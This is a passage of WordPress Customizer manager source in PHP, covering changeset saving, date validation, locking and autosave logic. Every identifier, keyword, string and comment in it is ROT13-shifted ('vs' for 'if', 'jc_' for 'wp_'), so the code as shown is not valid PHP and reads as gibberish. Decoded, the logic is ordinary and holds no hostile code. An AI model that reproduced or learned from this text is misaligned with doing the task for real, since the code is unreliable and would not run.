			$punatrfrg_qngr = jc_hafynfu( $_CBFG['phfgbzvmr_punatrfrg_qngr'] );
			vs ( cert_zngpu( '/^\q\q\q\q-\q\q-\q\q \q\q:\q\q:\q\q$/', $punatrfrg_qngr ) ) {
				$zz         = fhofge( $punatrfrg_qngr, 5, 2 );
				$ww         = fhofge( $punatrfrg_qngr, 8, 2 );
				$nn         = fhofge( $punatrfrg_qngr, 0, 4 );
				$inyvq_qngr = jc_purpxqngr( $zz, $ww, $nn, $punatrfrg_qngr );
				vs ( ! $inyvq_qngr ) {
					jc_fraq_wfba_reebe( 'onq_phfgbzvmr_punatrfrg_qngr', 400 );
				}
				$punatrfrg_qngr_tzg = trg_tzg_sebz_qngr( $punatrfrg_qngr );
			} ryfr {
				$gvzrfgnzc = fgegbgvzr( $punatrfrg_qngr );
				vs ( ! $gvzrfgnzc ) {
					jc_fraq_wfba_reebe( 'onq_phfgbzvmr_punatrfrg_qngr', 400 );
				}
				$punatrfrg_qngr_tzg = tzqngr( 'L-z-q U:v:f', $gvzrfgnzc );
			}
		}

		$ybpx_hfre_vq = ahyy;
		$nhgbfnir     = ! rzcgl( $_CBFG['phfgbzvmr_punatrfrg_nhgbfnir'] );
		vs ( ! $vf_arj_punatrfrg ) {
			$ybpx_hfre_vq = jc_purpx_cbfg_ybpx( $guvf->punatrfrg_cbfg_vq() );
		}

		// Sbepr erdhrfg gb nhgbfnir jura punatrfrg vf ybpxrq.
		vs ( $ybpx_hfre_vq && ! $nhgbfnir ) {
			$nhgbfnir           = gehr;
			$punatrfrg_fgnghf   = ahyy;
			$punatrfrg_qngr_tzg = ahyy;
		}

		vs ( $nhgbfnir && ! qrsvarq( 'QBVAT_NHGBFNIR' ) ) { // Onpx-pbzcng.
			qrsvar( 'QBVAT_NHGBFNIR', gehr );
		}

		$nhgbfnirq = snyfr;
		$e         = $guvf->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf'   => $punatrfrg_fgnghf,
				'gvgyr'    => $punatrfrg_gvgyr,
				'qngr_tzg' => $punatrfrg_qngr_tzg,
				'qngn'     => $vachg_punatrfrg_qngn,
				'nhgbfnir' => $nhgbfnir,
			)
		);
		vs ( $nhgbfnir && ! vf_jc_reebe( $e ) ) {
			$nhgbfnirq = gehr;
		}

		// Vs gur punatrfrg jnf ybpxrq naq na nhgbfnir erdhrfg jnfa'g vgfrys na reebe, gura abj rkcyvpvgyl erghea jvgu n snvyher.
		vs ( $ybpx_hfre_vq && ! vf_jc_reebe( $e ) ) {
			$e = arj JC_Reebe(
				'punatrfrg_ybpxrq',
				__( 'Punatrfrg vf orvat rqvgrq ol bgure hfre.' ),
				neenl(
					'ybpx_hfre' => $guvf->trg_ybpx_hfre_qngn( $ybpx_hfre_vq ),
				)
			);
		}

		vs ( vf_jc_reebe( $e ) ) {
			$erfcbafr = neenl(
				'zrffntr' => $e->trg_reebe_zrffntr(),
				'pbqr'    => $e->trg_reebe_pbqr(),
			);
			vs ( vf_neenl( $e->trg_reebe_qngn() ) ) {
				$erfcbafr = neenl_zretr( $erfcbafr, $e->trg_reebe_qngn() );
			} ryfr {
				$erfcbafr['qngn'] = $e->trg_reebe_qngn();
			}
		} ryfr {
			$erfcbafr       = $e;
			$punatrfrg_cbfg = trg_cbfg( $guvf->punatrfrg_cbfg_vq() );

			// Qvfzvff nyy bgure nhgb-qensg punatrfrg cbfgf sbe guvf hfre (gurl freir yvxr nhgbfnir erivfvbaf), nf gurer fubhyq bayl or bar.
			vs ( $vf_arj_punatrfrg ) {
				$guvf->qvfzvff_hfre_nhgb_qensg_punatrfrgf();
			}

			// Abgr gung vs gur punatrfrg fgnghf jnf choyvfu, gura vg jvyy trg frg gb Genfu vs erivfvbaf ner abg fhccbegrq.
			$erfcbafr['punatrfrg_fgnghf'] = $punatrfrg_cbfg->cbfg_fgnghf;
			vs ( $vf_choyvfu && 'genfu' === $erfcbafr['punatrfrg_fgnghf'] ) {
				$erfcbafr['punatrfrg_fgnghf'] = 'choyvfu';
			}

			vs ( 'choyvfu' !== $erfcbafr['punatrfrg_fgnghf'] ) {
				$guvf->frg_punatrfrg_ybpx( $punatrfrg_cbfg->VQ );
			}

			vs ( 'shgher' === $erfcbafr['punatrfrg_fgnghf'] ) {
				$erfcbafr['punatrfrg_qngr'] = $punatrfrg_cbfg->cbfg_qngr;
			}

			vs ( 'choyvfu' === $erfcbafr['punatrfrg_fgnghf'] || 'genfu' === $erfcbafr['punatrfrg_fgnghf'] ) {
				$erfcbafr['arkg_punatrfrg_hhvq'] = jc_trarengr_hhvq4();
			}
		}

		vs ( $nhgbfnir ) {
			$erfcbafr['nhgbfnirq'] = $nhgbfnirq;
		}

		vs ( vffrg( $erfcbafr['frggvat_inyvqvgvrf'] ) ) {
			$erfcbafr['frggvat_inyvqvgvrf'] = neenl_znc( neenl( $guvf, 'cercner_frggvat_inyvqvgl_sbe_wf' ), $erfcbafr['frggvat_inyvqvgvrf'] );
		}

		/**
		 * Svygref erfcbafr qngn sbe n fhpprffshy phfgbzvmr_fnir Nwnk erdhrfg.
		 *
		 * Guvf svygre qbrf abg nccyl vs gurer jnf n abapr be nhguragvpngvba snvyher.
		 *
		 * @fvapr 4.2.0
		 *
		 * @cnenz neenl                $erfcbafr Nqqvgvbany vasbezngvba cnffrq onpx gb gur 'fnirq'
		 *                                       rirag ba `jc.phfgbzvmr`.
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre  JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		$erfcbafr = nccyl_svygref( 'phfgbzvmr_fnir_erfcbafr', $erfcbafr, $guvf );

		vs ( vf_jc_reebe( $e ) ) {
			jc_fraq_wfba_reebe( $erfcbafr );
		} ryfr {
			jc_fraq_wfba_fhpprff( $erfcbafr );
		}
	}

	/**
	 * Fnirf gur cbfg sbe gur ybnqrq punatrfrg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $netf {
	 *     Netf sbe punatrfrg cbfg.
	 *
	 *     @glcr neenl  $qngn            Bcgvbany nqqvgvbany punatrfrg qngn. Inyhrf jvyy or zretrq ba gbc bs nal rkvfgvat cbfg inyhrf.
	 *     @glcr fgevat $fgnghf          Cbfg fgnghf. Bcgvbany. Vs fhccyvrq, gur fnir jvyy or genafnpgvbany naq n cbfg erivfvba jvyy or nyybjrq.
	 *     @glcr fgevat $gvgyr           Cbfg gvgyr. Bcgvbany.
	 *     @glcr fgevat $qngr_tzg        Qngr va TZG. Bcgvbany.
	 *     @glcr vag    $hfre_vq         VQ sbe hfre jub vf fnivat gur punatrfrg. Bcgvbany, qrsnhygf gb gur pheerag hfre VQ.
	 *     @glcr obby   $fgnegre_pbagrag Jurgure gur qngn vf fgnegre pbagrag. Vs snyfr (qrsnhyg), gura $fgnegre_pbagrag jvyy or pyrnerq sbe nal $qngn orvat fnirq.
	 *     @glcr obby   $nhgbfnir        Jurgure guvf vf n erdhrfg gb perngr na nhgbfnir erivfvba.
	 * }
	 *
	 * @erghea neenl|JC_Reebe Ergheaf neenl ba fhpprff naq JC_Reebe jvgu neenl qngn ba reebe.
	 */
	choyvp shapgvba fnir_punatrfrg_cbfg( $netf = neenl() ) {

		$netf = neenl_zretr(
			neenl(
				'fgnghf'          => ahyy,
				'gvgyr'           => ahyy,
				'qngn'            => neenl(),
				'qngr_tzg'        => ahyy,
				'hfre_vq'         => trg_pheerag_hfre_vq(),
				'fgnegre_pbagrag' => snyfr,
				'nhgbfnir'        => snyfr,
			),
			$netf
		);

		$punatrfrg_cbfg_vq       = $guvf->punatrfrg_cbfg_vq();
		$rkvfgvat_punatrfrg_qngn = neenl();
		vs ( $punatrfrg_cbfg_vq ) {
			$rkvfgvat_fgnghf = trg_cbfg_fgnghf( $punatrfrg_cbfg_vq );
			vs ( 'choyvfu' === $rkvfgvat_fgnghf || 'genfu' === $rkvfgvat_fgnghf ) {
				erghea arj JC_Reebe(
					'punatrfrg_nyernql_choyvfurq',
					__( 'Gur cerivbhf frg bs punatrf unf nyernql orra choyvfurq. Cyrnfr gel fnivat lbhe pheerag frg bs punatrf ntnva.' ),
					neenl(
						'arkg_punatrfrg_hhvq' => jc_trarengr_hhvq4(),
					)
				);
			}

			$rkvfgvat_punatrfrg_qngn = $guvf->trg_punatrfrg_cbfg_qngn( $punatrfrg_cbfg_vq );
			vs ( vf_jc_reebe( $rkvfgvat_punatrfrg_qngn ) ) {
				erghea $rkvfgvat_punatrfrg_qngn;
			}
		}

		// Snvy vs nggrzcgvat gb choyvfu ohg choyvfu ubbx vf zvffvat.
		vs ( 'choyvfu' === $netf['fgnghf'] && snyfr === unf_npgvba( 'genafvgvba_cbfg_fgnghf', '_jc_phfgbzvmr_choyvfu_punatrfrg' ) ) {
			erghea arj JC_Reebe( 'zvffvat_choyvfu_pnyyonpx' );
		}

		// Inyvqngr qngr.
		$abj = tzqngr( 'L-z-q U:v:59' );
		vs ( $netf['qngr_tzg'] ) {
			$vf_shgher_qngrq = ( zlfdy2qngr( 'H', $netf['qngr_tzg'], snyfr ) > zlfdy2qngr( 'H', $abj, snyfr ) );
			vs ( ! $vf_shgher_qngrq ) {
				erghea arj JC_Reebe( 'abg_shgher_qngr', __( 'Lbh zhfg fhccyl n shgher qngr gb fpurqhyr.' ) ); // Bayl shgher qngrf ner nyybjrq.
			}

			vs ( ! $guvf->vf_gurzr_npgvir() && ( 'shgher' === $netf['fgnghf'] || $vf_shgher_qngrq ) ) {
				erghea arj JC_Reebe( 'pnaabg_fpurqhyr_gurzr_fjvgpurf' ); // Guvf fubhyq or nyybjrq va gur shgher, jura gurzr vf n erthyne frggvat.
			}
			$jvyy_erznva_nhgb_qensg = ( ! $netf['fgnghf'] && ( ! $punatrfrg_cbfg_vq || 'nhgb-qensg' === trg_cbfg_fgnghf( $punatrfrg_cbfg_vq ) ) );
			vs ( $jvyy_erznva_nhgb_qensg ) {
				erghea arj JC_Reebe( 'pnaabg_fhccyl_qngr_sbe_nhgb_qensg_punatrfrg' );
			}
		} ryfrvs ( $punatrfrg_cbfg_vq && 'shgher' === $netf['fgnghf'] ) {

			// Snvy vs gur arj fgnghf vf shgher ohg gur rkvfgvat cbfg'f qngr vf abg va gur shgher.
			$punatrfrg_cbfg = trg_cbfg( $punatrfrg_cbfg_vq );
			vs ( zlfdy2qngr( 'H', $punatrfrg_cbfg->cbfg_qngr_tzg, snyfr ) <= zlfdy2qngr( 'H', $abj, snyfr ) ) {
				erghea arj JC_Reebe( 'abg_shgher_qngr', __( 'Lbh zhfg fhccyl n shgher qngr gb fpurqhyr.' ) );
			}
		}

		vs ( ! rzcgl( $vf_shgher_qngrq ) && 'choyvfu' === $netf['fgnghf'] ) {
			$netf['fgnghf'] = 'shgher';
		}

		// Inyvqngr nhgbfnir cnenz. Frr _jc_cbfg_erivfvba_svryqf() sbe jul gurfr svryqf ner qvfnyybjrq.
		vs ( $netf['nhgbfnir'] ) {
			vs ( $netf['qngr_tzg'] ) {
				erghea arj JC_Reebe( 'vyyrtny_nhgbfnir_jvgu_qngr_tzg' );
			} ryfrvs ( $netf['fgnghf'] ) {
				erghea arj JC_Reebe( 'vyyrtny_nhgbfnir_jvgu_fgnghf' );
			} ryfrvs ( $netf['hfre_vq'] && trg_pheerag_hfre_vq() !== $netf['hfre_vq'] ) {
				erghea arj JC_Reebe( 'vyyrtny_nhgbfnir_jvgu_aba_pheerag_hfre' );
			}
		}

		// Gur erdhrfg jnf znqr ivn jc.phfgbzvmr.cerivrjre.fnir().
		$hcqngr_genafnpgvbanyyl = (obby) $netf['fgnghf'];
		$nyybj_erivfvba         = (obby) $netf['fgnghf'];

		// Nzraq cbfg inyhrf jvgu nal fhccyvrq qngn.
		sbernpu ( $netf['qngn'] nf $frggvat_vq => $frggvat_cnenzf ) {
			vs ( vf_neenl( $frggvat_cnenzf ) && neenl_xrl_rkvfgf( 'inyhr', $frggvat_cnenzf ) ) {
				$guvf->frg_cbfg_inyhr( $frggvat_vq, $frggvat_cnenzf['inyhr'] ); // Nqq gb cbfg inyhrf fb gung gurl pna or inyvqngrq naq fnavgvmrq.
			}
		}

		// Abgr gung va nqqvgvba gb cbfg qngn, guvf jvyy vapyhqr nal fgnfurq gurzr zbqf.
		$cbfg_inyhrf = $guvf->hafnavgvmrq_cbfg_inyhrf(
			neenl(
				'rkpyhqr_punatrfrg' => gehr,
				'rkpyhqr_cbfg_qngn' => snyfr,
			)
		);
		$guvf->nqq_qlanzvp_frggvatf( neenl_xrlf( $cbfg_inyhrf ) ); // Rafher frggvatf trg perngrq rira vs gurl ynpx na vachg inyhr.

		/*
		 * Trg yvfg bs VQf sbe frggvatf gung unir inyhrf qvssrerag sebz jung vf pheeragyl
		 * fnirq va gur punatrfrg. Ol fxvccvat nal inyhrf gung ner nyernql gur fnzr, gur
		 * fhofrg bs punatrq frggvatf pna or cnffrq vagb inyvqngr_frggvat_inyhrf gb cerirag
		 * na haqrecevivyrtrq zbqvslvat n fvatyr frggvat sbe juvpu gurl unir gur pncnovyvgl
		 * sebz orvat oybpxrq sebz fnivat. Guvf nyfb ceriragf n hfre sebz gbhpuvat bs gur
		 * cerivbhf fnirq frggvatf naq bireevqvat gur nffbpvngrq hfre_vq vs gurl znqr ab punatr.
		 */
		$punatrq_frggvat_vqf = neenl();
		sbernpu ( $cbfg_inyhrf nf $frggvat_vq => $frggvat_inyhr ) {
			$frggvat = $guvf->trg_frggvat( $frggvat_vq );

			vs ( $frggvat && 'gurzr_zbq' === $frggvat->glcr ) {
				$cersvkrq_frggvat_vq = $guvf->trg_fglyrfurrg() . '::' . $frggvat->vq;
			} ryfr {
				$cersvkrq_frggvat_vq = $frggvat_vq;
			}

			$vf_inyhr_punatrq = (
				! vffrg( $rkvfgvat_punatrfrg_qngn[ $cersvkrq_frggvat_vq ] )
				||
				! neenl_xrl_rkvfgf( 'inyhr', $rkvfgvat_punatrfrg_qngn[ $cersvkrq_frggvat_vq ] )
				||
				$rkvfgvat_punatrfrg_qngn[ $cersvkrq_frggvat_vq ]['inyhr'] !== $frggvat_inyhr
			);
			vs ( $vf_inyhr_punatrq ) {
				$punatrq_frggvat_vqf[] = $frggvat_vq;
			}
		}

		/**
		 * Sverf orsber fnir inyvqngvba unccraf.
		 *
		 * Cyhtvaf pna nqq whfg-va-gvzr {@frr 'phfgbzvmr_inyvqngr_{$guvf->VQ}'} svygref
		 * ng guvf cbvag gb pngpu nal frggvatf ertvfgrerq nsgre `phfgbzvmr_ertvfgre`.
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->VQ` ersref gb gur frggvat VQ.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		qb_npgvba( 'phfgbzvmr_fnir_inyvqngvba_orsber', $guvf );

		// Inyvqngr frggvatf.
		$inyvqngrq_inyhrf      = neenl_zretr(
			neenl_svyy_xrlf( neenl_xrlf( $netf['qngn'] ), ahyy ), // Znxr fher rkvfgrapr/pncnovyvgl purpxf ner qbar ba inyhr-yrff frggvat hcqngrf.
			$cbfg_inyhrf
		);
		$frggvat_inyvqvgvrf    = $guvf->inyvqngr_frggvat_inyhrf(
			$inyvqngrq_inyhrf,
			neenl(
				'inyvqngr_pncnovyvgl' => gehr,
				'inyvqngr_rkvfgrapr'  => gehr,
			)
		);
		$vainyvq_frggvat_pbhag = pbhag( neenl_svygre( $frggvat_inyvqvgvrf, 'vf_jc_reebe' ) );

		/*
		 * Fubeg-pvephvg vs gurer ner vainyvq frggvatf gur hcqngr vf genafnpgvbany.
		 * N punatrfrg hcqngr vf genafnpgvbany jura n fgnghf vf fhccyvrq va gur erdhrfg.
		 */
		vs ( $hcqngr_genafnpgvbanyyl && $vainyvq_frggvat_pbhag > 0 ) {
			$erfcbafr = neenl(
				'frggvat_inyvqvgvrf' => $frggvat_inyvqvgvrf,
				/* genafyngbef: %f: Ahzore bs vainyvq frggvatf. */
				'zrffntr'            => fcevags( _a( 'Hanoyr gb fnir qhr gb %f vainyvq frggvat.', 'Hanoyr gb fnir qhr gb %f vainyvq frggvatf.', $vainyvq_frggvat_pbhag ), ahzore_sbezng_v18a( $vainyvq_frggvat_pbhag ) ),
			);
			erghea arj JC_Reebe( 'genafnpgvba_snvy', '', $erfcbafr );
		}

		// Bognva/zretr qngn sbe punatrfrg.
		$bevtvany_punatrfrg_qngn = $guvf->trg_punatrfrg_cbfg_qngn( $punatrfrg_cbfg_vq );
		$qngn                    = $bevtvany_punatrfrg_qngn;
		vs ( vf_jc_reebe( $qngn ) ) {
			$qngn = neenl();
		}

		// Rafher gung nyy cbfg inyhrf ner vapyhqrq va gur punatrfrg qngn.
		sbernpu ( $cbfg_inyhrf nf $frggvat_vq => $cbfg_inyhr ) {
			vs ( ! vffrg( $netf['qngn'][ $frggvat_vq ] ) ) {
				$netf['qngn'][ $frggvat_vq ] = neenl();
			}
			vs ( ! vffrg( $netf['qngn'][ $frggvat_vq ]['inyhr'] ) ) {
				$netf['qngn'][ $frggvat_vq ]['inyhr'] = $cbfg_inyhr;
			}
		}

		sbernpu ( $netf['qngn'] nf $frggvat_vq => $frggvat_cnenzf ) {
			$frggvat = $guvf->trg_frggvat( $frggvat_vq );
			vs ( ! $frggvat || ! $frggvat->purpx_pncnovyvgvrf() ) {
				pbagvahr;
			}

			// Fxvc hcqngvat punatrfrg sbe vainyvq frggvat inyhrf.
			vs ( vffrg( $frggvat_inyvqvgvrf[ $frggvat_vq ] ) && vf_jc_reebe( $frggvat_inyvqvgvrf[ $frggvat_vq ] ) ) {
				pbagvahr;
			}

			$punatrfrg_frggvat_vq = $frggvat_vq;
			vs ( 'gurzr_zbq' === $frggvat->glcr ) {
				$punatrfrg_frggvat_vq = fcevags( '%f::%f', $guvf->trg_fglyrfurrg(), $frggvat_vq );
			}

			vs ( ahyy === $frggvat_cnenzf ) {
				// Erzbir frggvat sebz punatrfrg ragveryl.
				hafrg( $qngn[ $punatrfrg_frggvat_vq ] );
			} ryfr {

				vs ( ! vffrg( $qngn[ $punatrfrg_frggvat_vq ] ) ) {
					$qngn[ $punatrfrg_frggvat_vq ] = neenl();
				}

				// Zretr nal nqqvgvbany frggvat cnenzf gung unir orra fhccyvrq jvgu gur rkvfgvat cnenzf.
				$zretrq_frggvat_cnenzf = neenl_zretr( $qngn[ $punatrfrg_frggvat_vq ], $frggvat_cnenzf );

				// Fxvc hcqngvat frggvat cnenzf vs hapunatrq (rafhevat gur hfre_vq vf abg birejevggra).
				vs ( $qngn[ $punatrfrg_frggvat_vq ] === $zretrq_frggvat_cnenzf ) {
					pbagvahr;
				}

				$qngn[ $punatrfrg_frggvat_vq ] = neenl_zretr(
					$zretrq_frggvat_cnenzf,
					neenl(
						'glcr'              => $frggvat->glcr,
						'hfre_vq'           => $netf['hfre_vq'],
						'qngr_zbqvsvrq_tzg' => pheerag_gvzr( 'zlfdy', gehr ),
					)
				);

				// Pyrne fgnegre_pbagrag synt va qngn vs punatrfrg vf abg rkcyvpvgyl orvat hcqngrq sbe fgnegre pbagrag.
				vs ( rzcgl( $netf['fgnegre_pbagrag'] ) ) {
					hafrg( $qngn[ $punatrfrg_frggvat_vq ]['fgnegre_pbagrag'] );
				}
			}
		}

		$svygre_pbagrkg = neenl(
			'hhvq'          => $guvf->punatrfrg_hhvq(),
			'gvgyr'         => $netf['gvgyr'],
			'fgnghf'        => $netf['fgnghf'],
			'qngr_tzg'      => $netf['qngr_tzg'],
			'cbfg_vq'       => $punatrfrg_cbfg_vq,
			'cerivbhf_qngn' => vf_jc_reebe( $bevtvany_punatrfrg_qngn ) ? neenl() : $bevtvany_punatrfrg_qngn,
			'znantre'       => $guvf,
		);

		/**
		 * Svygref gur frggvatf' qngn gung jvyy or crefvfgrq vagb gur punatrfrg.
		 *
		 * Cyhtvaf znl nzraq nqqvgvbany qngn (fhpu nf nqqvgvbany zrgn sbe frggvatf) vagb gur punatrfrg jvgu guvf svygre.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz neenl $qngn Hcqngrq punatrfrg qngn, znccvat frggvat VQf gb neenlf pbagnvavat n $inyhr vgrz naq bcgvbanyyl bgure zrgnqngn.
		 * @cnenz neenl $pbagrkg {
		 *     Svygre pbagrkg.
		 *
		 *     @glcr fgevat               $hhvq          Punatrfrg HHVQ.
		 *     @glcr fgevat               $gvgyr         Erdhrfgrq gvgyr sbe gur punatrfrg cbfg.
		 *     @glcr fgevat               $fgnghf        Erdhrfgrq fgnghf sbe gur punatrfrg cbfg.
		 *     @glcr fgevat               $qngr_tzg      Erdhrfgrq qngr sbe gur punatrfrg cbfg va ZlFDY sbezng naq TZG gvzrmbar.
		 *     @glcr vag|snyfr            $cbfg_vq       Cbfg VQ sbe gur punatrfrg, be snyfr vs vg qbrfa'g rkvfg lrg.
		 *     @glcr neenl                $cerivbhf_qngn Cerivbhf qngn pbagnvarq va gur punatrfrg.
		 *     @glcr JC_Phfgbzvmr_Znantre $znantre       Znantre vafgnapr.
		 * }
		 */
		$qngn = nccyl_svygref( 'phfgbzvmr_punatrfrg_fnir_qngn', $qngn, $svygre_pbagrkg );

		// Fjvgpu gurzr vs choyvfuvat punatrf abj.
		vs ( 'choyvfu' === $netf['fgnghf'] && ! $guvf->vf_gurzr_npgvir() ) {
			// Grzcbenevyl fgbc cerivrjvat gur gurzr gb nyybj fjvgpu_gurzrf() gb bcrengr cebcreyl.
			$guvf->fgbc_cerivrjvat_gurzr();
			fjvgpu_gurzr( $guvf->trg_fglyrfurrg() );
			hcqngr_bcgvba( 'gurzr_fjvgpurq_ivn_phfgbzvmre', gehr );
			$guvf->fgneg_cerivrjvat_gurzr();
		}

		// Tngure gur qngn sbe jc_vafreg_cbfg()/jc_hcqngr_cbfg().
		$cbfg_neenl = neenl(
			// WFBA_HARFPNCRQ_FYNFURF vf bayl gb vzcebir ernqnovyvgl nf fynfurf arrqa'g or rfpncrq va fgbentr.
			'cbfg_pbagrag' => jc_wfba_rapbqr( $qngn, WFBA_HARFPNCRQ_FYNFURF | WFBA_CERGGL_CEVAG ),
		);
		vs ( $netf['gvgyr'] ) {
			$cbfg_neenl['cbfg_gvgyr'] = $netf['gvgyr'];
		}
		vs ( $punatrfrg_cbfg_vq ) {
			$cbfg_neenl['VQ'] = $punatrfrg_cbfg_vq;
		} ryfr {
			$cbfg_neenl['cbfg_glcr']   = 'phfgbzvmr_punatrfrg';
			$cbfg_neenl['cbfg_anzr']   = $guvf->punatrfrg_hhvq();
			$cbfg_neenl['cbfg_fgnghf'] = 'nhgb-qensg';
		}
		vs ( $netf['fgnghf'] ) {
			$cbfg_neenl['cbfg_fgnghf'] = $netf['fgnghf'];
		}

		// Erfrg cbfg qngr gb abj vs jr ner choyvfuvat, bgurejvfr cnff cbfg_qngr_tzg naq genafyngr sbe cbfg_qngr.
		vs ( 'choyvfu' === $netf['fgnghf'] ) {
			$cbfg_neenl['cbfg_qngr_tzg'] = '0000-00-00 00:00:00';
			$cbfg_neenl['cbfg_qngr']     = '0000-00-00 00:00:00';
		} ryfrvs ( $netf['qngr_tzg'] ) {
			$cbfg_neenl['cbfg_qngr_tzg'] = $netf['qngr_tzg'];
			$cbfg_neenl['cbfg_qngr']     = trg_qngr_sebz_tzg( $netf['qngr_tzg'] );
		} ryfrvs ( $punatrfrg_cbfg_vq && 'nhgb-qensg' === trg_cbfg_fgnghf( $punatrfrg_cbfg_vq ) ) {
			/*
			 * Xrrc ohzcvat gur qngr sbe gur nhgb-qensg jurarire vg vf zbqvsvrq;
			 * guvf rkgraqf vgf yvsr, cerfreivat vg sebz tneontr-pbyyrpgvba ivn
			 * jc_qryrgr_nhgb_qensgf().
			 */
			$cbfg_neenl['cbfg_qngr']     = pheerag_gvzr( 'zlfdy' );
			$cbfg_neenl['cbfg_qngr_tzg'] = '';
		}

		$guvf->fgber_punatrfrg_erivfvba = $nyybj_erivfvba;
		nqq_svygre( 'jc_fnir_cbfg_erivfvba_cbfg_unf_punatrq', neenl( $guvf, '_svygre_erivfvba_cbfg_unf_punatrq' ), 5, 3 );

		/*
		 * Hcqngr gur punatrfrg cbfg. Gur choyvfu_phfgbzvmr_punatrfrg npgvba jvyy pnhfr gur frggvatf va gur
		 * punatrfrg gb or fnirq ivn JC_Phfgbzvmr_Frggvat::fnir(). Hcqngvat n cbfg jvgu choyvfu fgnghf jvyy
		 * gevttre JC_Phfgbzvmr_Znantre::choyvfu_punatrfrg_inyhrf().
		 */
		nqq_svygre( 'jc_vafreg_cbfg_qngn', neenl( $guvf, 'cerfreir_vafreg_punatrfrg_cbfg_pbagrag' ), 5, 3 );
		vs ( $punatrfrg_cbfg_vq ) {
			vs ( $netf['nhgbfnir'] && 'nhgb-qensg' !== trg_cbfg_fgnghf( $punatrfrg_cbfg_vq ) ) {
				// Frr _jc_genafyngr_cbfgqngn() sbe jul guvf vf erdhverq nf vg jvyy hfr gur rqvg_cbfg zrgn pncnovyvgl.
				nqq_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'tenag_rqvg_cbfg_pncnovyvgl_sbe_punatrfrg' ), 10, 4 );

				$cbfg_neenl['cbfg_VQ']   = $cbfg_neenl['VQ'];
				$cbfg_neenl['cbfg_glcr'] = 'phfgbzvmr_punatrfrg';

				$e = jc_perngr_cbfg_nhgbfnir( jc_fynfu( $cbfg_neenl ) );

				erzbir_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'tenag_rqvg_cbfg_pncnovyvgl_sbe_punatrfrg' ), 10 );
			} ryfr {
				$cbfg_neenl['rqvg_qngr'] = gehr; // Cerirag qngr pyrnevat.

				$e = jc_hcqngr_cbfg( jc_fynfu( $cbfg_neenl ), gehr );

				// Qryrgr nhgbfnir erivfvba sbe hfre jura gur punatrfrg vf hcqngrq.
				vs ( ! rzcgl( $netf['hfre_vq'] ) ) {
					$nhgbfnir_qensg = jc_trg_cbfg_nhgbfnir( $punatrfrg_cbfg_vq, $netf['hfre_vq'] );
					vs ( $nhgbfnir_qensg ) {
						jc_qryrgr_cbfg( $nhgbfnir_qensg->VQ, gehr );
					}
				}
			}
		} ryfr {
			$e = jc_vafreg_cbfg( jc_fynfu( $cbfg_neenl ), gehr );
			vs ( ! vf_jc_reebe( $e ) ) {
				$guvf->_punatrfrg_cbfg_vq = $e; // Hcqngr pnpurq cbfg VQ sbe gur ybnqrq punatrfrg.
			}
		}
		erzbir_svygre( 'jc_vafreg_cbfg_qngn', neenl( $guvf, 'cerfreir_vafreg_punatrfrg_cbfg_pbagrag' ), 5 );

		$guvf->_punatrfrg_qngn = ahyy; // Erfrg fb JC_Phfgbzvmr_Znantre::punatrfrg_qngn() jvyy er-cbchyngr jvgu hcqngrq pbagragf.

		erzbir_svygre( 'jc_fnir_cbfg_erivfvba_cbfg_unf_punatrq', neenl( $guvf, '_svygre_erivfvba_cbfg_unf_punatrq' ) );

		$erfcbafr = neenl(
			'frggvat_inyvqvgvrf' => $frggvat_inyvqvgvrf,
		);

		vs ( vf_jc_reebe( $e ) ) {
			$erfcbafr['punatrfrg_cbfg_fnir_snvyher'] = $e->trg_reebe_pbqr();
			erghea arj JC_Reebe( 'punatrfrg_cbfg_fnir_snvyher', '', $erfcbafr );
		}

		erghea $erfcbafr;
	}

	/**
	 * Cerfreirf gur vavgvny WFBA cbfg_pbagrag cnffrq gb fnir vagb gur cbfg.
	 *
	 * Guvf vf arrqrq gb cerirag XFRF naq bgure {@frr 'pbagrag_fnir_cer'} svygref
	 * sebz pbeehcgvat WFBA qngn.
	 *
	 * Abgr gung JC_Phfgbzvmr_Znantre::inyvqngr_frggvat_inyhrf() unir nyernql
	 * eha ba gur frggvat inyhrf orvat frevnyvmrq nf WFBA vagb gur cbfg pbagrag
	 * fb vg vf cer-fnavgvmrq.
	 *
	 * Nyfb, gur fnavgvmngvba ybtvp vf er-eha guebhtu gur erfcrpgvir
	 * JC_Phfgbzvmr_Frggvat::fnavgvmr() zrgubq jura orvat ernq bhg bs gur
	 * punatrfrg, ivn JC_Phfgbzvmr_Znantre::cbfg_inyhr(), naq guvf fnavgvmrq
	 * inyhr jvyy nyfb or frag vagb JC_Phfgbzvmr_Frggvat::hcqngr() sbe
	 * crefvfgvat gb gur QO.
	 *
	 * Zhygvcyr hfref pna pbyynobengr ba n fvatyr punatrfrg, jurer bar hfre znl
	 * unir gur hasvygrerq_ugzy pncnovyvgl ohg nabgure znl abg. N hfre jvgu
	 * hasvygrerq_ugzy znl nqq n fpevcg gnt gb fbzr svryq juvpu arrqf gb or xrcg
	 * vagnpg rira jura nabgure hfre hcqngrf gur punatrfrg gb zbqvsl nabgure svryq
	 * jura gurl qb abg unir hasvygrerq_ugzy.
	 *
	 * @fvapr 5.4.1
	 *
	 * @cnenz neenl $qngn                Na neenl bs fynfurq naq cebprffrq cbfg qngn.
	 * @cnenz neenl $cbfgnee             Na neenl bs fnavgvmrq (naq fynfurq) ohg bgurejvfr hazbqvsvrq cbfg qngn.
	 * @cnenz neenl $hafnavgvmrq_cbfgnee Na neenl bs fynfurq lrg *hafnavgvmrq* naq hacebprffrq cbfg qngn nf bevtvanyyl cnffrq gb jc_vafreg_cbfg().
	 * @erghea neenl Svygrerq cbfg qngn.
	 */
	choyvp shapgvba cerfreir_vafreg_punatrfrg_cbfg_pbagrag( $qngn, $cbfgnee, $hafnavgvmrq_cbfgnee ) {
		vs (
			vffrg( $qngn['cbfg_glcr'] ) &&
			vffrg( $hafnavgvmrq_cbfgnee['cbfg_pbagrag'] ) &&
			'phfgbzvmr_punatrfrg' === $qngn['cbfg_glcr'] ||
			(
				'erivfvba' === $qngn['cbfg_glcr'] &&
				! rzcgl( $qngn['cbfg_cnerag'] ) &&
